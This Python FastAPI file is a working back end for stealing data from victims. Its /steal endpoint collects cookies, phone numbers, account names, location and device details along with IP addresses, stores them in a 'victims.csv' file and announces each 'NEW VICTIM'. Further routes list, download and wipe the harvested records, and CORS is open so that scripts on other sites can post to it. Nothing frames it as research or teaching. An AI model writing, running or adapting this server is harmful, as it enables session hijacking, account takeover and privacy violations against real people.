from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, FileResponse
import uvicorn
import csv
import os
from datetime import datetime

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

stolen_data = []
CSV_FILE = "victims.csv"

def save_to_csv(entry):
    file_exists = os.path.isfile(CSV_FILE)
    with open(CSV_FILE, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["timestamp", "ip", "user_agent", "cookies", "device", "location", "screen", "phone", "account"])
        if not file_exists:
            writer.writeheader()
        writer.writerow(entry)

@app.post("/steal")
async def steal(request: Request):
    global stolen_data
    body = await request.json()
    entry = {
        "timestamp": datetime.now().strftime("%H:%M:%S"),
        "ip": request.client.host,
        "user_agent": request.headers.get("user-agent", "Unknown"),
        "cookies": body.get("cookies", ""),
        "device": body.get("device", ""),
        "location": body.get("location", "Unknown"),
        "screen": body.get("screen", ""),
        "phone": body.get("phone", ""),
        "account": body.get("name", "")
    }
    stolen_data.append(entry)
    save_to_csv(entry)
    print(f"🔴 NEW VICTIM: {entry['ip']} — {entry['phone']} at {entry['timestamp']}")
    return {"status": "ok"}

@app.get("/data")
async def get_data():
    global stolen_data
    return {"victims": stolen_data, "count": len(stolen_data)}

@app.get("/download")
async def download_csv():
    if os.path.isfile(CSV_FILE):
        return FileResponse(CSV_FILE, media_type="text/csv", filename="victims.csv")
    return {"error": "No data yet"}

@app.delete("/reset")
async def reset():
    global stolen_data
    stolen_data = []
    if os.path.isfile(CSV_FILE):
        os.remove(CSV_FILE)
    print("🗑️ All data cleared")
    return {"status": "cleared"}

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    return open("dashboard.html").read()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=7000)
